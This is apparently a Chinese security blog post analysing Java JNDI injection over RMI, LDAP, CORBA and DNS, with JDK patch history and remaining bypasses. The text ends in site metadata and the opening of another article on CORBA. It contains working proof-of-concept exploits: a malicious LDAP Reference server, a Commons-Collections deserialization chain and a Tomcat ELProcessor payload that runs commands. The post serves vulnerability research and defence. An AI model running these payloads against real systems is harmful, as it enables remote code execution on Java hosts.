NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125; &#125; catch (IOException e) &#123; NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125;&#125; 如果设置了codebase并且trustURLCodebase为true，就会用codebase来进行反序列化，否则就是原生反序列化。具体实现是重写了resolveClass，不细说了。那么现在知道RMI+JNDI修复后，默认情况下LDAP+JNDI是不能直接通过反序列化实现远程类加载的。再看其他两个caseObj#decodeRmiObject 123456789101112131415161718/* * A RMI object is stored in the directory as * javaClassName * value: Object.getClass(); * javaRemoteLocation * value: URL of RMI object (accessed through the RMI Registry) * javaCodebase: * value: URL of codebase of where to find classes for object * * Return the RMI Location URL itself. This will be turned into * an RMI object when getObjectInstance() is called on it. * %%% Ignore codebase for now. Depend on RMI registry to send code.-RL * @deprecated For backward compatibility only */private static Object decodeRmiObject(String className, String rmiName, String[] codebases) throws NamingException &#123; return new Reference(className, new StringRefAddr(&quot;URL&quot;, rmiName));&#125; 这个点存储的是RMI的Reference，会在getObjectInstance的时候创建，和前面Reference+JNDI类似的工厂模式。那还要找后面调了getObjectInstance的地方，先放着，看第三个：Obj#decodeReference 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* * Restore a Reference object from several LDAP attributes */private static Reference decodeReference(Attributes attrs, String[] codebases) throws NamingException, IOException &#123; Attribute attr; String className; String factory = null; if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) &#123; className = (String)attr.get(); &#125; else &#123; throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] + &quot; attribute is required&quot;); &#125; if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) &#123; factory = (String)attr.get(); &#125; Reference ref = new Reference(className, factory, (codebases != null? codebases[0] : null)); /* * string encoding of a RefAddr is either: * * #posn#&lt;type&gt;#&lt;address&gt; * or * #posn#&lt;type&gt;##&lt;base64-encoded address&gt; */ if ((attr = attrs.get(JAVA_ATTRIBUTES[REF_ADDR])) != null) &#123; String val, posnStr, type; char separator; int start, sep, posn; BASE64Decoder decoder = null; ClassLoader cl = helper.getURLClassLoader(codebases); ...... if (decoder == null) decoder = new BASE64Decoder(); RefAddr ra = (RefAddr) deserializeObject( decoder.decodeBuffer(val.substring(start)), cl); refAddrList.setElementAt(ra, posn); &#125; else &#123; // Single separator indicates a StringRefAddr refAddrList.setElementAt(new StringRefAddr(type, val.substring(start)), posn); &#125; &#125; // Copy to real reference for (int i = 0; i &lt; refAddrList.size(); i++) &#123; ref.add(refAddrList.elementAt(i)); &#125; &#125; return (ref);&#125; 太长了省略了一些，大意就是用查询到的信息创建一个Reference，如果能进if，过程里也调用了deserializeObject，但一样是受限的。那么实际上后两种情况都返回的是Reference，看看接下来是怎么从这个Reference创建对象的，其实这部分和JNDI+RMI很类似。不管获取到的obj是什么，都会调用到DirectoryManager#getObjectInstance 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment, Attributes attrs) throws Exception &#123; ObjectFactory factory; ObjectFactoryBuilder builder = getObjectFactoryBuilder(); if (builder != null) &#123; // builder must return non-null factory factory = builder.createObjectFactory(refInfo, environment); if (factory instanceof DirObjectFactory) &#123; return ((DirObjectFactory)factory).getObjectInstance( refInfo, name, nameCtx, environment, attrs); &#125; else &#123; return factory.getObjectInstance(refInfo, name, nameCtx, environment); &#125; &#125; // use reference if possible Reference ref = null; if (refInfo instanceof Reference) &#123; ref = (Reference) refInfo; &#125; else if (refInfo instanceof Referenceable) &#123; ref = ((Referenceable)(refInfo)).getReference(); &#125; Object answer; if (ref != null) &#123; String f = ref.getFactoryClassName(); if (f != null) &#123; // if reference identifies a factory, use exclusively factory = getObjectFactoryFromReference(ref, f); if (factory instanceof DirObjectFactory) &#123; return ((DirObjectFactory)factory).getObjectInstance( ref, name, nameCtx, environment, attrs); &#125; else if (factory != null) &#123; return factory.getObjectInstance(ref, name, nameCtx, environment); &#125; // No factory found, so return original refInfo. // Will reach this point if factory class is not in // class path and reference does not contain a URL for it return refInfo; &#125; else &#123; // if reference has no factory, check for addresses // containing URLs // ignore name &amp; attrs params; not used in URL factory answer = processURLAddrs(ref, name, nameCtx, environment); if (answer != null) &#123; return answer; &#125; &#125; &#125; // try using any specified factories answer = createObjectFromFactories(refInfo, name, nameCtx, environment, attrs); return (answer != null) ? answer : refInfo;&#125; 实际上这个函数和NamingManager#getObjectInstance基本是一样的，如果是传一个Reference就会调getObjectFactoryFromReference进行远程类加载，并且这个函数里面没看见有做限制的地方。那么只要LDAP服务端返回构造好的Reference就能绕过RMI+JNDI的限制继续攻击客户端了，简单写个poc：绑定恶意Reference： 123456789101112public class JNDILDAPServer &#123; public static void main(String[] args) throws Exception&#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;); env.put(Context.PROVIDER_URL, &quot;ldap://localhost:10389&quot;); InitialContext initialContext = new InitialContext(env); Reference refObj = new Reference(&quot;TestRef&quot;, &quot;TestRef&quot;, &quot;http://localhost:7777/&quot;); initialContext.rebind(&quot;cn=test,ou=users,dc=example,dc=com&quot;, refObj); &#125;&#125; 客户端不变，lookup的时候导致RCE。其实Obj#decodeObject里第二个if和第三个是差不多的，都是返回一个Reference。但第二个if用到的属性值是废弃的，LDAP服务端好像不支持，只能自己构造恶意服务端，也没太大意义，就不复现了。分析完感觉上Java开发者是想修复所有JNDI调用的远程类加载问题的，但可能是因为有两个VersionHelper12，修了一个忘了另一个，导致getObjectFactoryFromReference里面没有修复。 JNDI+CORBA第三个JNDI支持的服务是CORBA，关于CORBA的细节放在了之前单独的文章里，这里主要讲CORBA和JNDI结合使用的场景。常用的基于RMI+IIOP的实现和RMI实现很像。远程接口： 123public interface IRemoteObj extends java.rmi.Remote &#123; public void sayHello(String msg) throws java.rmi.RemoteException;&#125; 远程类： 12345678910public class RemoteObjImpl extends PortableRemoteObject implements IRemoteObj &#123; protected RemoteObjImpl() throws RemoteException &#123; &#125; @Override public void sayHello(String msg) throws RemoteException &#123; System.out.println(msg); &#125;&#125; 开启ORBD 1orbd -ORBInitialPort 1050 -ORBInitialHost localhost 服务端： 12345678910public class JNDICORBAServer&#123; public static void main( String[] args ) throws Exception &#123; IRemoteObj remoteObj = new RemoteObjImpl(); InitialContext initialContext = new InitialContext(); initialContext.rebind(&quot;iiop://127.0.0.1:1050/remoteObj&quot;, remoteObj); &#125;&#125; 客户端： 123456789public class JNDICORBAClient&#123; public static void main( String[] args ) throws Exception &#123; InitialContext initialContext = new InitialContext(); IRemoteObj hello = (IRemoteObj) initialContext.lookup(&quot;iiop://127.0.0.1:1050/remoteObj&quot;); hello.sayHello(&quot;Hello&quot;); &#125;&#125; 服务端需要先手动创建stub，切换到class的目录执行： 1rmic -classpath . -iiop org.example.RemoteObjImpl 执行后成功在服务端执行。这个过程和RMI类似会有反序列化以及一些动态类加载的风险。但和RMI一样也是很受限的，调试一下直接看CNCtx#lookup 1234567891011121314151617181920212223242526272829303132public java.lang.Object lookup(Name name) throws NamingException &#123; if (_nc == null) throw new ConfigurationException( &quot;Context does not have a corresponding NamingContext&quot;); if (name.size() == 0 ) return this; // %%% should clone() so that env can be changed NameComponent[] path = CNNameParser.nameToCosName(name); java.lang.Object answer = null; try &#123; answer = callResolve(path); try &#123; // Check whether object factory codebase is trusted if (CorbaUtils.isObjectFactoryTrusted(answer)) &#123; answer = NamingManager.getObjectInstance( answer, name, this, _env); &#125; &#125; catch (NamingException e) &#123; throw e; &#125; catch (Exception e) &#123; NamingException ne = new NamingException( &quot;problem generating object using object factory&quot;); ne.setRootCause(e); throw ne; &#125; &#125; catch (CannotProceedException cpe) &#123; javax.naming.Context cctx = getContinuationContext(cpe); return cctx.lookup(cpe.getRemainingName()); &#125; return answer;&#125; 第一个关键点是_NamingContextStub#callResolve 1234567891011121314151617181920212223242526public org.omg.CORBA.Object resolve (org.omg.CosNaming.NameComponent[] n) throws org.omg.CosNaming.NamingContextPackage.NotFound, org.omg.CosNaming.NamingContextPackage.CannotProceed, org.omg.CosNaming.NamingContextPackage.InvalidName&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;resolve&quot;, true); org.omg.CosNaming.NameHelper.write ($out, n); $in = _invoke ($out); org.omg.CORBA.Object $result = org.omg.CORBA.ObjectHelper.read ($in); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/NotFound:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.NotFoundHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/CannotProceed:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.CannotProceedHelper.read ($in); else if (_id.equals (&quot;IDL:omg.org/CosNaming/NamingContext/InvalidName:1.0&quot;)) throw org.omg.CosNaming.NamingContextPackage.InvalidNameHelper.read ($in); else throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return resolve (n ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // resolve 之前分析CORBA的时候分析过，这里的ObjectHelper.read最后是调用RMIClassLoader.loadClass进行类加载的，和RMI一样，基本是没有办法进行远程类加载的。回到lookup，获取到answer后，看到了熟悉的NamingManager#getObjectInstance。但这里有个if判断，看一下：CorbaUtils#isObjectFactoryTrusted 12345678910111213141516171819public static boolean isObjectFactoryTrusted(Object obj) throws NamingException &#123; // Extract Reference, if possible Reference ref = null; if (obj instanceof Reference) &#123; ref = (Reference) obj; &#125; else if (obj instanceof Referenceable) &#123; ref = ((Referenceable)(obj)).getReference(); &#125; if (ref != null &amp;&amp; ref.getFactoryClassLocation() != null &amp;&amp; !CNCtx.trustURLCodebase) &#123; throw new ConfigurationException( &quot;The object factory is untrusted. Set the system property&quot; + &quot; &#x27;com.sun.jndi.cosnaming.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;); &#125; return true;&#125; 明显是和RMI+JNDI的利用一起修复的，看下CNCtx.trustURLCodebase 123456789public static final boolean trustURLCodebase;static &#123; // System property to control whether classes may be loaded from an // arbitrary URL code base PrivilegedAction&lt;String&gt; act = () -&gt; System.getProperty( &quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot;, &quot;false&quot;); String trust = AccessController.doPrivileged(act); trustURLCodebase = &quot;true&quot;.equalsIgnoreCase(trust);&#125; 事实上CNCtx和RegistryContext是在同一个版本修复的(openjdk版本557d133dbc61)，添加了各自的trustURLCodebase属性。所以基于CORBA的JNDI利用没有太大意义，完全可以用RMI替代，除非是应对某些黑名单的场景。 JNDI+DNS最后看一下DNS，因为这是官网写的Jdk最后一个JNDI支持的服务，直接跟到DnsContext#c_lookup 123456789101112131415161718192021222324252627282930public Object c_lookup(Name name, Continuation cont) throws NamingException &#123; cont.setSuccess(); if (name.isEmpty()) &#123; DnsContext ctx = new DnsContext(this); ctx.resolver = new Resolver(servers, timeout, retries); // clone for parallelism return ctx; &#125; try &#123; DnsName fqdn = fullyQualify(name); ResourceRecords rrs = getResolver().query(fqdn, lookupCT.rrclass, lookupCT.rrtype, recursion, authoritative); Attributes attrs = rrsToAttrs(rrs, null); DnsContext ctx = new DnsContext(this, fqdn); return DirectoryManager.getObjectInstance(ctx, name, this, environment, attrs); &#125; catch (NamingException e) &#123; cont.setError(this, name); throw cont.fillInException(e); &#125; catch (Exception e) &#123; cont.setError(this, name); NamingException ne = new NamingException( &quot;Problem generating object using object factory&quot;); ne.setRootCause(e); throw cont.fillInException(ne); &#125;&#125; 可以看到虽然调用了DirectoryManager.getObjectInstance，但第一个参数是不可控的，也就没办法把第一个参数改成Reference进行远程类加载了。 LDAP+JNDI的修复前面说了RMI+JNDI的修复方式是片面的，导致使用LDAP依然可以进行远程类加载，而在Jdk8u191也对LDAP+JNDI导致的远程类加载进行了修复，看具体的代码改动：com.sun.naming.internal.VersionHelper12在openjdk的28d4d67065ab版本改成了如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657final class VersionHelper12 extends VersionHelper &#123; // Disallow external from creating one of these. VersionHelper12() &#123; &#125; public Class&lt;?&gt; loadClass(String className) throws ClassNotFoundException &#123; return loadClass(className, getContextClassLoader()); &#125; /** * Determines whether classes may be loaded from an arbitrary URL code base. */ private static final String TRUST_URL_CODEBASE_PROPERTY = &quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;; private static final String trustURLCodebase = AccessController.doPrivileged( new PrivilegedAction&lt;String&gt;() &#123; public String run() &#123; try &#123; return System.getProperty(TRUST_URL_CODEBASE_PROPERTY, &quot;false&quot;); &#125; catch (SecurityException e) &#123; return &quot;false&quot;; &#125; &#125; &#125; ); /** * Package private. * * This internal method is used with Thread Context Class Loader (TCCL), * please don&#x27;t expose this method as public. */ Class&lt;?&gt; loadClass(String className, ClassLoader cl) throws ClassNotFoundException &#123; Class&lt;?&gt; cls = Class.forName(className, true, cl); return cls; &#125; /** * @param className A non-null fully qualified class name. * @param codebase A non-null, space-separated list of URL strings. */ public Class&lt;?&gt; loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException &#123; if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) &#123; ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); &#125; else &#123; return null; &#125; &#125; 在之前分析的动态加载工厂类的地方修改了com.sun.jndi.ldap.object.trustURLCodebase为false，这样JNDI的远程类加载真正的漏洞点终于修复了。之前的修复都往上了一层，可能因为这是所有JNDI服务通用的工具类，没办法用通用的方法修复。大概整理下几处修复对应的版本，在这能看见各版本和时间的对应https://www.java.com/releases/RMI动态类加载的修复在2013.2.28对应6u45、7u21(openjdk版本96890625ebdf)，当时Jdk8还没发行RMI/CORBA+JNDI的修复在2016.10.21，对应Jdk6u141、7u131、8u121(openjdk版本557d133dbc61)LDAP+JNDI的修复在2018.7.10，对应Jdk8u191、7u201、6u211(openjdk版本28d4d67065ab)很多帖子说第RMI+JNDI修复的版本是8u113，但根本没有113这个版本。可能是因为8u121的前一个版本是8u112，但Jdk的版本号本来也不是连续的，不知道谁第一个写的，抄来抄去。那么在这些修复后JNDI注入就没用了吗？当然不是，还是有操作空间的。 JNDI+反序列化在前面分析的时候，注意到实际上某些过程里是有原生反序列化点的，那么就算不能直接远程类加载RCE，有反序列化点来打本地gadget也是有机会的。整理一下有以下几处触发了反序列化：1、RMI调用流程里的RegistryImpl_Stub#lookup2、RMI调用流程里的ReferenceWrapper_Stub#getReference3、LDAP调用流程里的Obj#deserializeObjectRMI的就不说了，之前整理过，看下LDAP触发原生反序列化的写法。其实很简单，就是绑定一个恶意对象：服务端： 12345678910111213141516171819202122232425262728293031323334353637public class JNDILDAPServer &#123; public static void main(String[] args) throws Exception&#123; InitialContext initialContext = new InitialContext(); initialContext.rebind(&quot;ldap://localhost:10389/cn=test,ou=users,dc=example,dc=com&quot;, genEvilMap()); &#125; public static HashMap genEvilMap() throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); lazyMap.remove(&quot;aaa&quot;); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap,chainedTransformer); return map2; &#125;&#125; 客户端和之前一样直接lookup就行了，这就是一个普通的反序列化攻击，需要被攻击的客户端上有利用链，比如这里手动加的cc。在21年4月7号，openjdk版本f396f4a7ee5d对LDAP触发的反序列化进行了一次更新，修改了Obj#decodeObject 1234567891011121314151617181920212223242526272829303132333435static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123; if (!VersionHelper12.isSerialDataAllowed()) &#123; throw new NamingException(&quot;Object deserialization is not allowed&quot;); &#125; ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl); &#125; else if ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) &#123; // For backward compatibility only return decodeRmiObject( (String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(), (String)attr.get(), codebases); &#125; attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]); if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; return decodeReference(attrs, codebases); &#125; return null; &#125; catch (IOException e) &#123; NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125;&#125; 实际上是在反序列化前加了一个if，判断VersionHelper12.isSerialDataAllowed()。跟进去发现是添加了一个新属性com.sun.jndi.ldap.object.trustSerialDatacom.sun.jndi.ldap.VersionHelper12 12345678910111213141516171819202122private static final String TRUST_SERIAL_DATA_PROPERTY = &quot;com.sun.jndi.ldap.object.trustSerialData&quot;;/** * Determines whether objects may be deserialized from the content of * &#x27;javaSerializedData&#x27; attribute. */private static final boolean trustSerialData;// Determine whether classes may be loaded from an arbitrary URL code base.private static final boolean trustURLCodebase;static &#123; String trust = getPrivilegedProperty(TRUST_URL_CODEBASE_PROPERTY, &quot;false&quot;); trustURLCodebase = &quot;true&quot;.equalsIgnoreCase(trust); String trustSDString = getPrivilegedProperty(TRUST_SERIAL_DATA_PROPERTY, &quot;true&quot;); trustSerialData = &quot;true&quot;.equalsIgnoreCase(trustSDString);&#125;public static boolean isSerialDataAllowed() &#123; return trustSerialData;&#125; 但看到这个属性默认是开启的，也就是只是提供了一个开关，依然是可以攻击的。这次更新还把原来的Class.forName改成了不触发初始化的方式，但应该没有具体的利用链用到，可能只是未雨绸缪。前面分析Obj#decodeObject时候看到过底下的case里的decodeReference实际上也触发了反序列化，这个更新实际上又给漏了。不过不知道是不是有人提醒，21年9月8号，openjdk版本8c553f12bece又更新了一下Obj#decodeReference 1234567891011121314151617181920212223242526private static Reference decodeReference(Attributes attrs,String[] codebases) throws NamingException, IOException &#123; ...... else if (val.charAt(start) == separator) &#123; // Check if deserialization of binary RefAddr is allowed from // &#x27;javaReferenceAddress&#x27; LDAP attribute. if (!VersionHelper12.isSerialDataAllowed()) &#123; throw new NamingException(&quot;Object deserialization is not allowed&quot;); &#125; // Double separators indicate a non-StringRefAddr // Content is a Base64-encoded serialized RefAddr ++start; // skip over consecutive separator // %%% RL: exception if empty after double separator if (decoder == null) decoder = new BASE64Decoder(); RefAddr ra = (RefAddr) deserializeObject( decoder.decodeBuffer(val.substring(start)), cl); refAddrList.setElementAt(ra, posn); ...... 在反序列化前检查了trustSerialData属性，又修了一处潜在漏洞，教教教还教。不过直到当前最新版Jdk8u311，依然是可以用JNDI触发反序列化的，LDAP和RMI都可以。 JNDI+本地工厂类除了触发反序列化进行攻击，还有一种攻击思路，就是依然走Reference加载工厂类那一条路，只不过不加载远程类，而是加载本地工厂类。也是和找gadget有点像，这个工厂类需要满足一些条件：1、需要实现javax.naming.spi.ObjectFactory2、getObjectInstance中可以触发危险方法Jdk里面那几个类都不满足了，所以只能到其他通用的包里去找，在tomcat中有这么一个类满足条件org.apache.naming.factory.BeanFactory#getObjectInstance 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws NamingException &#123; if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName); &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName); &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; if (beanClass == null) &#123; throw new NamingException (&quot;Class not found: &quot; + beanClassName); &#125; BeanInfo bi = Introspector.getBeanInfo(beanClass); PropertyDescriptor[] pda = bi.getPropertyDescriptors(); Object bean = beanClass.getConstructor().newInstance(); /* Look for properties with explicitly configured setter */ RefAddr ra = ref.get(&quot;forceString&quot;); Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;(); String value; if (ra != null) &#123; value = (String)ra.getContent(); Class&lt;?&gt; paramTypes[] = new Class[1]; paramTypes[0] = String.class; String setterName; int index; /* Items are given as comma separated list */ for (String param: value.split(&quot;,&quot;)) &#123; param = param.trim(); /* A single item can either be of the form name=method * or just a property name (and we will use a standard * setter) */ index = param.indexOf(&#x27;=&#x27;); if (index &gt;= 0) &#123; setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; setterName = &quot;set&quot; + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1); &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; catch (NoSuchMethodException|SecurityException ex) &#123; throw new NamingException (&quot;Forced String setter &quot; + setterName + &quot; not found for property &quot; + param); &#125; &#125; &#125; Enumeration&lt;RefAddr&gt; e = ref.getAll(); while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(&quot;scope&quot;) || propName.equals(&quot;auth&quot;) || propName.equals(&quot;forceString&quot;) || propName.equals(&quot;singleton&quot;)) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (IllegalAccessException| IllegalArgumentException| InvocationTargetException ex) &#123; throw new NamingException (&quot;Forced String setter &quot; + method.getName() + &quot; threw exception for property &quot; + propName); &#125; continue; &#125; 又有loadClass又有newInstance又有invoke，要素齐全。代码太长了，删了一部分，分析下关键逻辑。核心自然是method.invoke(bean, valueArray)这里，在bean上调用了method方法，参数是valueArray。跟踪逻辑后发现这三个变量都是可控的，只是bean需要能调用getConstructor.newInstance()，method需要是public的。那么需要一个有无参构造方法的类，里面的某个public方法能触发任意代码执行，其实满足这个条件最先想到的是TemplatesImpl，但这个类需要修改私有属性值，只靠传参是不行的。Jdk里应该是没有满足这个条件的类了，一般用的是tmocat种的ELProcessor#eval 123public Object eval(String expression) &#123; return getValue(expression, Object.class);&#125; 这里有个细节，实际上没有构造方法的类可以用无参的newInstance创建，而只有有参数构造方法的不行，ELProcessor是没有构造函数的，所以满足条件。Payload长这样： 123ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;xxx=eval&quot;));ref.add(new StringRefAddr(&quot;xxx&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd.exe&#x27;,&#x27;-c&#x27;,&#x27;calc&#x27;]).start()\\&quot;)&quot;)); 把这个对象绑到JNDI上就行了，客户端lookup的时候触发代码执行。 JNDI gadget作为屈指可数的JDK内置代码执行点，TemplatesImpl作为反序列化的sink被玩出了花，同样JNDI注入与反序列化结合的潜力无疑也是巨大的，分析下反序列化中的JNDI注入。JNDI注入的调用链如下：1、InitialContext#lookup2、RegistryContext#lookup3、RegistryContext#decodeObject4、NamingManager#getObjectInstance5、NamingManager#getObjectFactoryFromReference6、VersionHelper12#loadClass这几个方法里面，第一个和第二个都是只实现了Context接口(Referenceable只有RegistryContext实现了，可以忽略)的类调用的lookup方法，可以算作一个方法。第三个是私有方法，很难利用。第四个是public方法，但它是一个静态方法，参数可能不好控制，备选。第五个是default作用域，很难利用。第六个是default作用域，很难利用。那实际上想要利用JNDI注入作为反序列化链的执行点，只有两条路：一是找到一个在反序列化中对Context类型变量调用lookup并且参数可控的点。二是找到一个在反序列化中调用getObjectInstance并且参数可控的点。那明显还是第一种希望大一点，目前一般用的是Jdk的内置类JdbcRowSetImpl#connect 123456789101112131415161718192021222324252627282930313233343536373839404142private Connection connect() throws SQLException &#123; // Get a JDBC connection. // First check for Connection handle object as such if // &quot;this&quot; initialized using conn. if(conn != null) &#123; return conn; &#125; else if (getDataSourceName() != null) &#123; // Connect using JNDI. try &#123; Context ctx = new InitialContext(); DataSource ds = (DataSource)ctx.lookup (getDataSourceName()); //return ds.getConnection(getUsername(),getPassword()); if(getUsername() != null &amp;&amp; !getUsername().equals(&quot;&quot;)) &#123; return ds.getConnection(getUsername(),getPassword()); &#125; else &#123; return ds.getConnection(); &#125; &#125; catch (javax.naming.NamingException ex) &#123; throw new SQLException(resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString()); &#125; &#125; else if (getUrl() != null) &#123; // Check only for getUrl() != null because // user, passwd can be null // Connect using the driver manager. return DriverManager.getConnection (getUrl(), getUsername(), getPassword()); &#125; else &#123; return null; &#125;&#125; 触发JNDI查询的if需要getDataSourceName不为空，看一下： 1234private String dataSource;public String getDataSourceName() &#123; return dataSource;&#125; 是一个属性值，序列化时候是可以修改的，也可以用setDataSourceName函数修改。connect是个私有方法，找一下上层调用，有三处：JdbcRowSetImpl#prepareJdbcRowSetImpl#getDatabaseMetaDataJdbcRowSetImpl#setAutoCommit看到有几个方法是get/set方法，在基于bean的反序列化时有可能会调用，比如fastJson。Jdk里面应该没有其他的触发点了，但分析其他组件时可以留意Context.lookup这一形式，可能存在JNDI注入导致RCE。 参考链接https://docs.oracle.com/javase/tutorial/jndi/index.htmlhttps://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.htmlhttps://docs.oracle.com/javase/jndi/tutorial/objects/index.htmlhttps://docs.oracle.com/javase/8/docs/technotes/guides/jndi/index.htmlhttps://www.cs.binghamton.edu/~steflik/cs328/jndi/https://www.infoworld.com/article/2076073/ldap-and-jndi--together-forever.htmlhttps://docs.oracle.com/javase/8/docs/technotes/guides/idl/jidlExample.html","categories":[],"tags":[]},{"title":"古老的馈赠之CORBA漏洞分析","slug":"古老的馈赠之CORBA漏洞分析","date":"2021-11-16T08:19:14.000Z","updated":"2021-11-18T11:28:04.471Z","comments":true,"path":"2021/11/16/古老的馈赠之CORBA漏洞分析/","link":"","permalink":"http://yoursite.com/2021/11/16/%E5%8F%A4%E8%80%81%E7%9A%84%E9%A6%88%E8%B5%A0%E4%B9%8BCORBA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"搞安全的总是要赛博考古，找找被遗忘的角落。这两年的漏洞偶尔会出现CORBA这个东西，这玩意好像比RMI还老，得有二十多年历史了，但很多框架还支持它，简单分析一下。","text":"搞安全的总是要赛博考古，找找被遗忘的角落。这两年的漏洞偶尔会出现CORBA这个东西，这玩意好像比RMI还老，得有二十多年历史了，但很多框架还支持它，简单分析一下。CORBA也是用于RPC的，可以理解为和RMI差不多，但不像RMI是Java特有的，CORBA是一种跨语言的分布式调用结构，先写个demo。 Java CORBA Demo实现首先，CORBA是跨语言的结构，所以先要用它自己的格式创建出对应文件，再编译成Java。CORBA自己的语言文件叫IDL，长这样： 1234567module HelloApp&#123; interface Hello &#123; string sayHello(); &#125;;&#125;; 其实就是package为HelloApp的Hello接口，里面有sayHello方法。然后用jdk自带的idlj工具编译： 1idlj -fall hello.idl 编译后多出来一个HelloApp包，里面有六个文件。如果参数改成-fclient/-fserver可以单独生成客户端和服务端的文件。这里列举一下。客户端服务端都有：HelloOperations 1234public interface HelloOperations &#123; String sayHello ();&#125; // interface HelloOperations 一个接口，定义了idl里定义的方法Hello 123public interface Hello extends HelloOperations, org.omg.CORBA.Object, org.omg.CORBA.portable.IDLEntity &#123;&#125; // interface Hello 其实就像RMI，需要两边都有远程接口的定义服务端：一个接口，名称是idl定义的接口，继承了几个接口。HelloPOA 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public abstract class HelloPOA extends org.omg.PortableServer.Servant implements HelloApp.HelloOperations, org.omg.CORBA.portable.InvokeHandler&#123; // Constructors private static java.util.Hashtable _methods = new java.util.Hashtable (); static &#123; _methods.put (&quot;sayHello&quot;, new java.lang.Integer (0)); &#125; public org.omg.CORBA.portable.OutputStream _invoke (String $method, org.omg.CORBA.portable.InputStream in, 